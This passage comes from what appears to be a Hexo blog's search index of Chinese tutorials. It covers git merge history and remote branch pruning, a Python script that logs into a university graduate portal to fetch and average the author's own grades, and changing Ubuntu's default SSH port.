"\346\225\260\346\215\256\345\210\206\346\236\220\351\235\242\350\257\225-\344\270\273\350\247\202\351\242\230/\345\275\223\351\235\242\350\257\225\345\256\230\350\257\264\357\274\214\342\200\234\344\275\240\346\234\211\344\273\200\344\271\210\350\246\201\351\227\256\346\210\221\357\274\237\342\200\235\346\200\216\346\240\267\345\233\236\347\255\224\346\234\200\345\212\240\345\210\206\357\274\237.md"因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。合并后，我们用git log看看分支历史：1234567891011121314151617$ git log --graph --pretty=oneline --abbrev-commit* 1d78e1a merge with no-ff|\| * 237907d update readme| * 75a4fbc update 主观题| * 9669636 update 协作文档|/* b1aa3ed update 协作文档* 5c7018e update readme* 85c15e2 update readme* a803ecf update readme* bb3adfb update 协作文档* acf2104 Merge pull request #1 from dta0502/add-license-1|\| * 4330188 Create LICENSE|/* f05e852 Initial commit二、Fast Forward和no fast foward合并模式对比图]]></content>
      <categories>
        <category>工具使用</category>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git远程分支的删除与同步]]></title>
    <url>%2Farchives%2Fa6b05b04.html</url>
    <content type="text"><![CDATA[本文主要介绍Git同步远程已删除的分支的方法。一、删除远程分支命令删除远程分支命令：1git push origin :readme或者：1git push origin --delete readme二、同步本地的远程分支关键问题：另一个用户使用git fetch并不能同步获取到readme分支被删除。1git fetch此命令没有更新的显示，说明并无删除的信息。然后执行git pull时，报错：12Your configuration specifies to merge with the ref &apos;refs/heads/readme&apos;from the remote, but no such ref was fetched.这肯定是执行git fetch时，报错。1git fetch origin readme1fatal: Couldn&apos;t find remote ref readme但检查分支时，发现origin/readme还存在。1git branch -a12345678 dev master* readme remotes/origin/HEAD -&gt; origin/master remotes/origin/add-license-1 remotes/origin/dev remotes/origin/master remotes/origin/readme这说明，remotes/origin/*这些远程跟踪分支，仅仅是远程分支的一个缓存，并且，不能通过git fetch命令获取到分支删除的更新。执行命令1git remote show origin12345678910111213141516* remote origin Fetch URL: git@github.com:dta0502/Data-Analysis-In-Action.git Push URL: git@github.com:dta0502/Data-Analysis-In-Action.git HEAD branch: master Remote branches: add-license-1 tracked dev tracked master tracked refs/remotes/origin/readme stale (use &apos;git remote prune&apos; to remove) Local branches configured for &apos;git pull&apos;: dev merges with remote dev master merges with remote master readme merges with remote readme Local refs configured for &apos;git push&apos;: dev pushes to dev (up to date) master pushes to master (up to date)发现refs/remotes/origin/readme状态是stale(陈旧的)，并且后面有命令提示。1git remote prune origin123Pruning originURL: git@github.com:dta0502/Data-Analysis-In-Action.git * [pruned] origin/readme或者执行1git fetch -p在执行fetch之后，删除远程不存在的远程跟踪分支。三、删除本地多余分支12git checkout mastergit branch -d readme]]></content>
      <categories>
        <category>工具使用</category>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[东南大学研究生系统模拟登录]]></title>
    <url>%2Farchives%2F386e167.html</url>
    <content type="text"><![CDATA[这是一个简单的Python爬虫模拟登录实战小脚本，主要在于__VIEWSTATE这个变量的处理。一、模拟登录1、导入包1234import requestsfrom lxml import etreeimport pandas as pdimport base642、构造请求头、表单数据。1url = "http://121.248.63.139/nstudent/login.aspx"123456headers = &#123; 'Host': "121.248.63.139", 'Origin': "http://121.248.63.139", 'Referer': "http://121.248.63.139/nstudent/login.aspx", 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"&#125;12# 创建一个session对象 s = requests.Session()下面是关键，由于ASP.NET网站每次都会发送一个__VIEWSTATE到隐藏域，后面提交表单时会提交上去，所以这里我们需要先获取到这个值，具体方法是先请求一次该url，从response中提取出__VIEWSTATE，然后再在POST的时候提交上去。1response = s.get(url,headers = headers)123content = response.textsel = etree.HTML(content)viewstate = sel.xpath('//input[@name="__VIEWSTATE"]/@value')[0]下面简单看下__VIEWSTATE经过base64解码后的值：1viewstate_decode = base64.b64decode(viewstate)下面是构造POST请求提交的数据：1234567data = &#123; '__VIEWSTATE': viewstate, 'txt_user': "用户名", 'txt_password': "密码", 'ok.x':'44', 'ok.y':'6'&#125;3、建立会话。requests库的session对象能够帮我们跨请求保持某些参数，这样我们才能进行后面的查成绩等等操作。12# 用session对象发出get请求response = s.post(url,headers = headers,data = data)1response.apparent_encoding‘utf-8’1response.encoding = response.apparent_encoding然后输入：1response.text看到这个下面这个界面，说明模拟登录成功！欢迎使用东大研究生管理平台二、成绩查询1、成绩页面获取采用session变量去访问成绩页面。12url_grade = "http://121.248.63.139/nstudent/grgl/xskccjcx.aspx"response_grade = s.get(url_grade,headers = headers)1content = response_grade.text2、页面解析问题处理这里出了个问题，下面是问题描述以及解决方案。1)、问题描述我在用XPath匹配元素的时候，发现老是出错，后来发现是&lt;tbody&gt;标签上有文章。2)、问题分析我使用Chrome的元素审查对网页进行分析来得到XPath路径，但是Chrome会对网页源码进行加工，在&lt;table&gt;标签中，如果源码中没有写&lt;tbody&gt;标签，在元素审查和查看网页源代码中还是会将&lt;tbody&gt;强行添加上。当然，若源代码中没有&lt;tbody&gt;，而我们信任Chrome而把它添进XPath的话，是不会匹配出想要的结果的。我们可以通过1print(response)对源代码进行检查，确定有没有&lt;tbody&gt;标签后，再得出XPath。12selector = etree.HTML(content)table = selector.xpath('//table[@class="box" and @bordercolor="#5c6bac"]/tr') #这里很奇怪，明明中间还有一个tbody，但是加了tbody定位不到3、学位课程成绩查询下面查询学位课程成绩：123456789degreeCourses = table[2].xpath('td[1]/table/tr')degreeList = []for i in degreeCourses[1:]: course = i.xpath('td[1]/text()')[0] credit = i.xpath('td[2]/text()')[0] term = i.xpath('td[3]/text()')[0] score = i.xpath('td[4]/text()')[0] score_standardized = i.xpath('td[5]/text()')[0] degreeList.append(&#123;'课程':course,'课程学分':credit,'选修学期':term,'成绩':score,'规格化成绩':score_standardized&#125;)12df_degree = pd.DataFrame(degreeList)df_degree.dataframe tbody tr th:only-of-type{vertical-align:middle}.dataframe tbody tr th{vertical-align:top}.dataframe thead th{text-align:right}成绩规格化成绩课程课程学分选修学期09183工程矩阵理论3.0118281学位英语4.0228581学位英语0138581中国特色社会主义理论与实践研究2.0149078VLSI设计技术3.0259187射频集成电路设计基础3.0167789CMOS模拟集成电路分析与设计3.014、非学位课程成绩查询123456789optionalCourses = table[2].xpath('td[2]/table/tr')optionalList = []for i in optionalCourses[1:]: course = i.xpath('td[1]/text()')[0] credit = i.xpath('td[2]/text()')[0] term = i.xpath('td[3]/text()')[0] score = i.xpath('td[4]/text()')[0] score_standardized = i.xpath('td[5]/text()')[0] optionalList.append(&#123;'课程':course,'课程学分':credit,'选修学期':term,'成绩':score,'规格化成绩':score_standardized&#125;)12df_optional = pd.DataFrame(optionalList)df_optional.dataframe tbody tr th:only-of-type{vertical-align:middle}.dataframe tbody tr th{vertical-align:top}.dataframe thead th{text-align:right}成绩规格化成绩课程课程学分选修学期08281自然辩证法概论1.0119584微波毫米波工程设计2.0228781微波非线性网络2.0239584微波电路系统与应用2.0249379光纤通信用集成电路设计3.025、规格化平均成绩计算123456sums_score = 0sums_credit = 0for i in range(len(df_degree['规格化成绩'])): sums_score += int(df_degree['规格化成绩'][i]) * float(df_degree['课程学分'][i]) sums_credit += float(df_degree['课程学分'][i])average_degree = sums_score / sums_credit1average_degree83.16666666666667]]></content>
      <categories>
        <category>爬虫</category>
        <category>实战</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>模拟登录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu修改SSH默认端口号]]></title>
    <url>%2Farchives%2Fef98249d.html</url>
    <content type="text"><![CDATA[SSH端口爆破是常见的网络攻击之一。SSH的默认连接端口为22端口，如果不修改容易被黑客扫描，暴力破解，存在一定安全隐患，如果这个时候你的密码很简单的话，被爆破开的几率会大大增加。一、修改端口修改方法如下：在/etc/ssh/sshd_config中找到Port 22，将其修改为2022。如果用户想让22和2022端口同时开放，只需在/etc/ssh/sshd_config增加一行内容如下：12Port 22Port 2022这里22端口暂时还没删除又重新开一个端口是因为要给自己留后路，万一等下新端口不能连接，默认端口又关闭了就麻烦了.二、重启 SSH 服务1service ssh restart注意：如果远程登陆SSH的时候提示：no route to host，应该是防火墙没做好对应端口的配置，设置下防火墙就ok了。参考：修改 VPS 服务器 SSH 默认连接端口]]></content>
      <categories>
        <category>工具使用</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
</search>
